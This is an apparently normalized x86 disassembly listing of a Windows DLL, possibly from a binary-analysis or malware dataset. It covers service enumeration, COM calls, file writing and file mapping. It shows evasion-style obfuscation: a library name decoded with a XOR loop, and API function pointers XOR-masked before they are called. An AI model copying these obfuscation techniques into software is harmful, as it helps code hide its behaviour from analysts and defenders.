movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea esi [ ebx + ebx - 0x1 ]
jmp r-xdata
sub_1004e270
push ebp
mov ebp esp
sub esp 0x10
push ebx
push edi
xor edi edi
xor ebx ebx
cmp esi edi
je r-xdata
pop edi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x28 ]
lea ecx [ ebp - 0x10 ]
push ecx
push esi
call edx
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
pop edi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov edx [ eax + 0x44 ]
lea ecx [ ebp - 0x8 ]
push ecx
push esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
call edx
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
cmp [ ebp - 0xc ] edi
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x4 ]
cmp eax edi
jne r-xdata
lea ebx [ edi + 0x3 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov ebx 0x4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x8 ]
cmp eax edi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x4 ] edi
pop edi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
sub_1004e334
mov edi edi
push edi
push rw-data
mov edi ecx
call [ InterlockedIncrement@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
retn
push esi
mov esi rw-data
push esi
call sub_10050ab9
add esi 0x18
pop ecx
cmp esi rw-data
jl r-xdata
pop esi
sub_1004e370
push ebp
mov ebp esp
push 0xffffffff
push sub_10089a9c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x330
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push 0x208
xor edi edi
lea ecx [ ebp - 0x2b4 ]
push edi
push ecx
mov [ ebp - 0x33c ] eax
call sub_1007f8f0
add esp 0xc
lea ecx [ ebp - 0x2b4 ]
call sub_10063850
mov esi eax
cmp esi edi
je r-xdata
push 0x144
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x328 ] eax
mov [ ebp - 0x4 ] 0x2
cmp eax edi
je r-xdata
lea edx [ ebp - 0xac ]
lea eax [ edi + 0x62 ]
call sub_10069020
lea edx [ ebp - 0x2ec ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] edi
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x1
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x2bc ] esi
jb r-xdata
xor eax eax
push eax
call sub_10006be0
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x2bc ] 0x7
mov [ ebp - 0x2c0 ] edi
mov [ ebp - 0x2d0 ] cx
cmp [ ebp - 0x2d8 ] esi
jb r-xdata
mov eax [ ebp - 0x2d0 ]
push eax
call sub_1000a86e
add esp 0x4
lea edi [ ebp - 0x328 ]
call sub_1006df00
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp - 0x32c ]
cmp esi edi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
lea ecx [ ebp - 0x330 ]
mov [ ebp - 0x330 ] edi
mov [ ebp - 0x32c ] edi
call sub_100310b0
mov ebx 0x3
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x330 ]
cmp esi edi
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebp - 0x2ec ]
push edx
call sub_1000a86e
add esp 0x4
lea ecx [ ebp - 0x2b4 ]
push ecx
lea ecx [ ebp - 0x330 ]
mov [ ebp - 0x328 ] edi
call sub_1001ee70
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0xa8 ]
mov eax 0x121
call sub_10069020
lea eax [ ebp - 0x2ec ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0xa8 ]
lea esi [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x4
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x5
call sub_10022b50
mov esi 0x8
cmp [ ebp - 0x2bc ] esi
jb r-xdata
mov eax 0x2
jmp r-xdata
lea eax [ esi + 0x4 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x330 ]
call sub_10011800
mov esi eax
xor edi edi
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x15a
call sub_10069020
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x7
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] bl
call sub_100702e0
mov [ ebp - 0x328 ] 0x4
xor edx edx
mov [ ebp - 0x2bc ] 0x7
mov [ ebp - 0x2c0 ] edi
mov [ ebp - 0x2d0 ] dx
cmp [ ebp - 0x2d8 ] esi
jb r-xdata
mov ecx [ ebp - 0x2d0 ]
push ecx
call sub_1000a86e
add esp 0x4
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov ecx [ ebp - 0x33c ]
push ecx
lea ebx [ ebp - 0x330 ]
call sub_1005b690
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x64 ]
lea eax [ edi + 0x79 ]
call sub_10069020
lea eax [ ebp - 0x2d0 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x64 ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x8
call sub_10040e00
add esp 0xc
mov edx eax
lea ecx [ edi + 0x12 ]
mov [ ebp - 0x4 ] 0x9
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x328 ] 0x5
jmp r-xdata
mov esi [ ebp - 0x328 ]
lea edx [ ebp - 0x5c ]
mov eax 0x5b
call sub_10069020
lea eax [ ebp - 0x324 ]
push esi
push eax
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x308 ]
mov [ ebp - 0x4 ] 0x12
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x13
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x324 ]
call sub_100702e0
mov esi 0xa
jmp r-xdata
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2ec ]
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
mov ebx [ ebp - 0x330 ]
lea eax [ ebp - 0x334 ]
push eax
lea ecx [ ebp - 0x338 ]
mov [ ebp - 0x334 ] edi
mov [ ebp - 0x338 ] edi
call sub_1002b180
mov esi eax
cmp esi edi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x2b
call sub_10069020
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xa
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xb
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x328 ] 0x6
jmp r-xdata
mov esi [ ebp - 0x330 ]
call sub_100720b0
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax esi
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x334 ]
test eax eax
je r-xdata
lea edi [ ebp - 0x338 ]
lea ecx [ ebp - 0x334 ]
call sub_10031c90
mov esi eax
test esi esi
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x76
call sub_10069020
lea ecx [ ebp - 0x2d0 ]
push esi
push ecx
call sub_10057f20
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xc
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xd
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x328 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x338 ]
mov ecx [ ebp - 0x334 ]
push eax
push ecx
lea eax [ ebp - 0x2b4 ]
call sub_1002f360
mov esi eax
add esp 0x8
test esi esi
je r-xdata
lea edx [ ebp - 0xac ]
mov eax 0xb0
call sub_10069020
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0xe
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0xf
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
mov [ ebp - 0x4 ] 0x3
call sub_100702e0
mov [ ebp - 0x328 ] 0x8
jmp r-xdata
lea edx [ ebp - 0xac ]
mov eax 0x11c
call sub_10069020
lea edx [ ebp - 0x2d0 ]
push esi
push edx
call sub_10057f20
push eax
lea edx [ ebp - 0xac ]
lea esi [ ebp - 0x2ec ]
mov [ ebp - 0x4 ] 0x10
call sub_10040e00
add esp 0xc
mov edx eax
mov ecx 0x12
mov [ ebp - 0x4 ] 0x11
call sub_10022b50
mov ecx esi
call sub_100702e0
lea ecx [ ebp - 0x2d0 ]
call sub_100702e0
lea eax [ ebp - 0x330 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10039fc0
mov eax 0x9
jmp r-xdata
sub_1004e9b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_1007f580
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_1004e9d3
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1004ecbf ]
jmp [ eax * 4 + jump_table_1004ec63 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10051f24
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1002f3fc
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1006995b
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1002b8b6
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1002f3fc
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1004ecd6
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x33333334 ]
int3
sub_1004ed00
test ebx ebx
je r-xdata
retn
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push esi
push ebx
call [ lstrlenW@IAT ]
lea esi [ eax + eax ]
lea eax [ esi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push esi
push ebx
push eax
mov [ edi + 0x4 ] eax
call sub_1007f580
add esp 0xc
pop esi
push eax
call [ LocalFree@IAT ]
mov [ edi + 0x4 ] 0x0
sub_1004ed40
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
cmp esi [ ebp + 0x10 ]
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
push ebx
mov ebx [ ebp + 0x8 ]
pop ebx
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
movzx eax [ esi ]
mov edx [ edi ]
push eax
mov eax [ edx + 0x8 ]
push ebx
mov ecx edi
call eax
test al al
jne r-xdata
sub_1004ed80
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1000fcc7
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1004edb0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ rw-data ]
push esi
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x28 ]
push ecx
push edx
push ebx
call eax
mov ecx [ ebp - 0x4 ]
add esp 0xc
xor ecx ebp
xor eax eax
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ r--data ]
lea ebx [ ebx ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff97
and edx 0xff
mov [ ebp + eax * 2 - 0x24 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x24 ]
xor eax eax
push ecx
mov [ ebp - 0x10 ] ax
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
lea edi [ ebp - 0xc ]
xor eax eax
call sub_1006dec0
mov edx edi
push edx
push esi
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
pop edi
test eax eax
jne r-xdata
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1004ee80
push ebp
mov ebp esp
sub esp 0x48c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x488 ] eax
call [ GetProcessHeap@IAT ]
push 0xf003f
push 0x0
mov edi eax
push 0x0
mov [ ebp - 0x484 ] edi
mov [ ebp - 0x470 ] 0x0
call [ OpenSCManagerW@IAT ]
mov esi eax
mov [ ebp - 0x478 ] esi
test esi esi
jne r-xdata
push ebx
mov ebx [ EnumServicesStatusExW@IAT ]
push 0x0
push 0x0
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x47c ]
push edx
push 0x0
push 0x0
push 0x3
push 0x10
push 0x0
push esi
call ebx
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x1 ]
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x47c ]
push eax
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov edi eax
mov [ ebp - 0x480 ] edi
test edi edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xea
je r-xdata
mov eax [ ebp - 0x47c ]
push 0x0
push 0x0
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x48c ]
push edx
push eax
push edi
push 0x3
push 0x10
push 0x0
push esi
call ebx
test eax eax
jne r-xdata
push esi
call [ CloseServiceHandle@IAT ]
pop ebx
lea eax [ edi + 0x3 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push esi
call [ CloseServiceHandle@IAT ]
pop ebx
pop edi
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x5c ]
xor eax eax
call sub_10028320
lea edx [ ebp - 0x14 ]
mov eax 0x2
call sub_10028320
push edx
lea eax [ ebp - 0x480 ]
push eax
lea ecx [ ebp - 0x478 ]
push ecx
lea edx [ ebp - 0x470 ]
push edx
lea eax [ ebp - 0x46c ]
push eax
lea ecx [ ebp - 0x474 ]
push ecx
lea edx [ ebp - 0x488 ]
push edx
lea edx [ ebp - 0x5c ]
lea ebx [ ebp - 0x264 ]
call sub_1002ce00
mov eax [ ebp - 0x478 ]
add esp 0x1c
push eax
call [ CloseServiceHandle@IAT ]
mov eax [ ebp - 0x470 ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop ebx
and eax 0xfffffffb
pop edi
xor ecx ebp
add eax 0x5
pop esi
call sub_10032529
mov esp ebp
pop ebp
retn
push esi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x484 ]
push edi
push 0x0
push ecx
call [ HeapFree@IAT ]
pop ebx
pop edi
mov eax 0x4
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1004f044
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0xc ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10051f24
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x10 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_1004f090
push ebp
mov ebp esp
push 0xffffffff
push sub_100889ac
mov eax [ fs : 0x0 ]
push eax
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov esi edx
mov [ ebp - 0x44 ] esi
mov [ ebp - 0x40 ] edi
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] ecx
call sub_1003c1d0
lea edi [ esi + 0x70 ]
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ edi + 0x14 ] eax
mov [ edi + 0x10 ] ebx
mov [ edi ] dx
mov [ ebp - 0x4 ] ebx
mov [ esi ] r--data
mov [ esi + 0x90 ] ebx
mov [ esi + 0xa8 ] eax
xor eax eax
mov [ esi + 0xa4 ] ebx
mov [ esi + 0x94 ] ax
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] ebx
mov [ esi + 0xbc ] ebx
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100542e0
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ rw-data ]
push ebx
push 0x80
push 0x4
push ebx
push ebx
mov [ ebp - 0x30 ] ecx
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push 0x60000000
push edi
call [ ebp - 0x30 ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov edi [ edi ]
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x54 ]
cmp eax ebx
je r-xdata
push ebx
push ebx
push ebx
push edi
call [ SetFilePointer@IAT ]
mov edx [ rw-data ]
mov ecx [ ebp - 0x34 ]
push ebx
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x3c ]
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
lea eax [ ebp - 0x38 ]
push eax
push ecx
push edx
push edi
call [ ebp - 0x30 ]
mov eax [ rw-data ]
mov [ ebp - 0x30 ] eax
xor [ ebp - 0x30 ] 0x38
xor [ ebp - 0x2f ] 0x38
xor [ ebp - 0x2e ] 0x38
xor [ ebp - 0x2d ] 0x38
push edi
call [ ebp - 0x30 ]
mov edx [ ebp - 0x34 ]
xor ecx ecx
cmp [ ebp - 0x38 ] edx
sete cl
mov [ esi + 0x8 ] ecx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov [ ebp - 0x30 ] eax
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x2c ]
call sub_10034100
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0xb4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10013950
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x30 ] eax
cmp eax ebx
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov edx [ edx + 0x4 ]
xor eax eax
mov [ ebp - 0x2c ] ax
mov eax edx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
lea edi [ eax + 0x2 ]
sub_1004f270
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
push eax
call [ LocalFree@IAT ]
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_1004f2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089428
mov eax [ fs : 0x0 ]
push eax
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi edx
push ebx
mov [ ebp - 0x60 ] eax
mov eax [ ebp + 0xc ]
push esi
push 0x0
mov [ ebp - 0x58 ] ecx
call sub_10015140
mov edx [ esi ]
add esp 0xc
push 0x0
push edx
push 0x0
push 0x4
push 0x0
push 0xffffffff
call [ CreateFileMappingW@IAT ]
